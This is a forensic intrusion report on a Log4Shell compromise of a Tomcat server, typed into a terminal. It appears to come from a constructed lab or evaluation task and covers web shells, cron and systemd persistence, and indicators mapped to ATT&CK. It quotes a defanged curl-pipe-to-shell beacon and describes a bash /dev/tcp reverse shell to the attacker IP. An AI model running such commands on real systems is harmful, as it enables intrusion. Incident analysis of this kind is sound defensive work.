[?2004l[?2004h> # Post-Compromise Forensic Intrusion Report
[?2004l[?2004h> 
[?2004l[?2004h> ## Executive Summary
[?2004l[?2004h> An external threat actor exploited an internet-facing Ubuntu 22.04 server (`log4shell-prod-01`) utilizing the Log4Shell vulnerability (`CVE-2021-44228`). The adversary gained initial remote code execution, planted JSP web shells, established an interactive reverse shell, installed dual persistence mechanisms (Cron and Systemd), and attempted anti-forensic timestomping and file deletion.
[?2004l[?2004h> 
[?2004l[?2004h> The automated SAS alert feed captured only a subset of the incident activities (`ALERT-01` through `ALERT-04`). Forensic investigation of `/disk` uncovered critical silent (un-alerted) persistence mechanisms, including a rogue cron job (`/disk/etc/cron.d/apache-cache:1-5`) and a hidden secondary web shell (`/disk/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp:1-2`).
[?2004l[?2004h> 
[?2004l[?2004h> ## Key Threat Indicators & Entities
[?2004l[?2004h> - **Attacker Origin IP**: `198.51.100.136` (cited in `/sas/cti/advisory.txt:5`, `/disk/tmp/.sysd:2`, `/disk/etc/cron.d/apache-cache:5`, and `/disk/var/lib/.cache/.wiped.bin:1`).
[?2004l[?2004h> - **Command & Control (C2) Domain**: `update-log4shell.example.cn` (defanged in advisory as `update-log4shell[.]example[.]cn`, cited in `/sas/cti/advisory.txt:25` and `/disk/var/lib/.cache/.wiped.bin:1`).
[?2004l[?2004h> - **Cryptomining Pool**: `stratum+tcp://xmr.log4shell.evil:3333` (defanged in advisory as `stratum+tcp[:]//xmr[.]log4shell[.]evil[:]3333`, cited in `/sas/cti/advisory.txt:26`).
[?2004l[?2004h> - **Cryptocurrency Wallet**: `4A000000000000000000ce1cc99945b1` (cited in `/sas/cti/advisory.txt:27`).
[?2004l[?2004h> 
[?2004l[?2004h> ## Full Attack Chain Narrative
[?2004l[?2004h> 
[?2004l[?2004h> 1. **Stage 1: Initial Access (T1190)**
[?2004l[?2004h>    - The attacker targeted the vulnerable Log4j2 library (`2.14`) configured in `/disk/opt/app/log4j2.xml:1-4` (also alerted in `/sas/alerts.json:26-33`).
[?2004l[?2004h>    - JNDI lookup functionality was enabled, allowing remote code execution via LDAP lookup (`${jndi:ldap://...}`) as documented in `/sas/cti/advisory.txt:11,19-21` and `/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:2`.
[?2004l[?2004h> 
[?2004l[?2004h> 2. **Stage 2: Web Shell Placement (T1505.003)**
[?2004l[?2004h>    - **Primary Web Shell**: Placed at `/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:1-2`. Alerted as `ALERT-01` in `/sas/alerts.json:2-9`.
[?2004l[?2004h>    - **Secondary Web Shell (SILENT)**: Placed at `/disk/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp:1-2` to maintain hidden backup web access. Un-alerted in `/sas/alerts.json`.
[?2004l[?2004h> 
[?2004l[?2004h> 3. **Stage 3: Execution & Reverse Shell (T1059.004)**
[?2004l[?2004h>    - The attacker spawned a reverse shell process invoking `bash -i` over `/dev/tcp` targeting C2 IP `198.51.100.136`.
[?2004l[?2004h>    - Artifact located at `/disk/tmp/.sysd:1-2`. Alerted as `ALERT-02` in `/sas/alerts.json:10-17`.
[?2004l[?2004h> 
[?2004l[?2004h> 4. **Stage 4: Cron Persistence (T1053.003) - SILENT**
[?2004l[?2004h>    - The adversary installed a cron file at `/disk/etc/cron.d/apache-cache:1-5`.
[?2004l[?2004h>    - The job runs every 15 minutes as user `nobody` (`/disk/etc/cron.d/apache-cache:4`) and includes an active root beacon execution comment line (`/disk/etc/cron.d/apache-cache:5` executing `curl hxxp://198.51.100.136/x | sh`).
[?2004l[?2004h>    - This item was completely absent from `/sas/alerts.json`.
[?2004l[?2004h> 
[?2004l[?2004h> 5. **Stage 5: Systemd Service Persistence (T1543.002)**
[?2004l[?2004h>    - The actor created a systemd service unit at `/disk/etc/systemd/system/apache-cache.service:1-7`.
[?2004l[?2004h>    - Disguised as "System Update Helper" (`/disk/etc/systemd/system/apache-cache.service:2`), the service launches a re-dropper payload (`/disk/etc/systemd/system/apache-cache.service:5`).
[?2004l[?2004h>    - Alerted as `ALERT-03` in `/sas/alerts.json:18-25`.
[?2004l[?2004h> 
[?2004l[?2004h> 6. **Stage 6: Stealth, Timestomping & Wiping (T1070.006) - SILENT**
[?2004l[?2004h>    - The secondary web shell (`/disk/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp:1-2`) was hidden with dot-prefix naming.
[?2004l[?2004h>    - Attacker tools and C2 binaries were wiped, leaving residual recovered artifact at `/disk/var/lib/.cache/.wiped.bin:1`.
[?2004l[?2004h>    - Timestomping activities occurred as documented in `/sas/cti/advisory.txt:16`.
[?2004l[?2004h> 
[?2004l[?2004h> ## Complete ATT&CK Technique & Findings Mapping Table
[?2004l[?2004h> 
[?2004l[?2004h> | Check ID | Artifact Path | ATT&CK Technique | Confidence | SAS Alert Status | Evidence Citation |
[?2004l[?2004h> |---|---|---|---|---|---|
[?2004l[?2004h> | `CHK-01` | `/var/lib/tomcat9/webapps/ROOT/static/status.jsp` | T1190 / T1505.003 | High | Alerted (`ALERT-01`) | `/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:1-2` |
[?2004l[?2004h> | `CHK-02` | `/tmp/.sysd` | T1059.004 | High | Alerted (`ALERT-02`) | `/disk/tmp/.sysd:1-2` |
[?2004l[?2004h> | `CHK-03` | `/etc/cron.d/apache-cache` | T1053.003 | High | **SILENT (Un-alerted)** | `/disk/etc/cron.d/apache-cache:1-5` |
[?2004l[?2004h> | `CHK-04` | `/etc/systemd/system/apache-cache.service` | T1543.002 | High | Alerted (`ALERT-03`) | `/disk/etc/systemd/system/apache-cache.service:1-7` |
[?2004l[?2004h> | `CHK-05` | `/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp` | T1505.003 / T1070.006 | High | **SILENT (Un-alerted)** | `/disk/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp:1-2` |
[?2004l[?2004h> | `CHK-06` | `/opt/app/log4j2.xml` | T1190 | High | Alerted (`ALERT-04`) | `/disk/opt/app/log4j2.xml:1-4` |
[?2004l[?2004h> 
